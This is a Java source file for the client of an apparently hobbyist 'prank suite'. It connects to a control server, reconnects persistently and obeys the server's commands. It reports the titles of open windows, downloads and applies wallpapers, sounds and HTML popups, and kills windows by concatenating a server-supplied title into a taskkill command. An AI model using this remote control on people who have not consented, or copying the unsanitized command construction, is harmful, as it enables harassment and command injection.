package me.toast.pranksuite;

import com.esotericsoftware.kryonet.Client;
import com.esotericsoftware.kryonet.Connection;
import com.esotericsoftware.kryonet.Listener;
import javafx.application.Application;
import javafx.application.Platform;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.List;

public class PSClient {

    public static Client CLIENT;
    public static String SERVER_IP;

    public static void tryConnect() {
        while (!CLIENT.isConnected()) {
            try {
                CLIENT.connect(5000, SERVER_IP, 54555);
                if (CLIENT.isConnected())
                    break;
            } catch (IOException e) {
                System.err.println("Couldn't connect retrying in 1 minute...");
                SleepFor1Minute();
            }
        }
    }

    public static Listener LISTENER = new Listener() {
        public void disconnected(Connection connection) {
            System.out.println("Disconnected from Server!");
            Thread thread = new Thread(PSClient::tryConnect); thread.start();
        }

        FileOutputStream out;
        long totalSize;
        long currentSize;
        String pathandname;
        Action action;
        public void received(Connection connection, Object object) {
            if (object instanceof Packets.OpenWindowsRequest) {
                System.out.println("Got Window Request!");

                Packets.OpenWindowsStartResponse startResponse = new Packets.OpenWindowsStartResponse();
                connection.sendTCP(startResponse);

                List<String> listOfWindows = RunningPrograms.getAllWindowNames();
                for (String listOfWindow : listOfWindows) {
                    Packets.OpenWindowsResponse response = new Packets.OpenWindowsResponse();
                    response.openWindow = listOfWindow;
                    connection.sendTCP(response);
                }
                Packets.OpenWindowsFinalResponse last = new Packets.OpenWindowsFinalResponse();
                connection.sendTCP(last);
            }

            if (object instanceof Packets.FileTransferRequest request) {
                System.out.println("Got Change Background Request!");

                String path = "./assets/";
                if (request.action == Action.WALLPAPER)
                    path+="backgrounds/";
                if (request.action == Action.SOUND)
                    path+="sounds/";
                if (request.action == Action.POPUP_HTML)
                    path+="html/";
                pathandname = path+"received-"+request.name;
                action = request.action;
                totalSize = request.totalSize;

                try {
                    out = new FileOutputStream(new File(pathandname).getAbsolutePath());
                } catch (FileNotFoundException e) {
                    throw new RuntimeException(e);
                }
            }
            if (object instanceof Packets.FileTransferPiece data) {
                int length = data.piece.length;
                System.out.println("Got FileTransferPiece! " + length);
                try {
                    out.write(data.piece);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
                currentSize += length;
                if (currentSize == totalSize) {
                    try {
                        out.close();
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }

                    File file = new File(pathandname);

                    if (action == Action.WALLPAPER)
                        WallpaperChanger.Change(file.getAbsolutePath());
                    if (action == Action.SOUND)
                        new PlaySound(file);
                   if (action == Action.POPUP_HTML) {
                       Platform.runLater(() -> {
                           Popup.STAGE.setTitle("");
                           Popup.STAGE.setScene(Popup.HTML);
                           Popup.ENGINE.load("file://"+file.getAbsolutePath());
                           Popup.STAGE.show();
                       });
                   }

                    currentSize = 0L;
                    totalSize = 0L;
                    action = null;
                    pathandname = "";

                    Packets.FileTransferFinish finish = new Packets.FileTransferFinish();
                    connection.sendTCP(finish);
                }
            }

            if (object instanceof Packets.TriggerPopup request) {
                System.out.println("Got a Trigger Popup Request!");
                Platform.runLater(() -> {
                    Popup.STAGE.setTitle(request.title);
                    Popup.MESSAGE.setText(request.message);
                    Popup.BUTTON.setText(request.button);
                    Popup.STAGE.setScene(Popup.POPUP);
                    Popup.STAGE.show();
                });
            }
            if (object instanceof Packets.CloseWindow request) {
                System.out.println("Got Close Window Request for: " + request.nameOfWindow);
                Runtime rt = Runtime.getRuntime();

                try {
                    rt.exec("taskkill /F /FI \"WINDOWTITLE eq "+ request.nameOfWindow + "\"");
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    };

    public static void main(String[] args) {
        SERVER_IP = "127.0.0.1";
        Thread.currentThread().setName("Main");

        new Thread(() -> Application.launch(Popup.class), "Popup").start();
        Platform.setImplicitExit(false);

        CLIENT = new Client();
        Packets.RegisterPackets(CLIENT.getKryo());
        Thread thread = new Thread(CLIENT, "Networking"); thread.start();

        tryConnect();

        CLIENT.addListener(LISTENER);
    }

    public static void SleepFor1Minute() {
        try {
            Thread.sleep(60000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
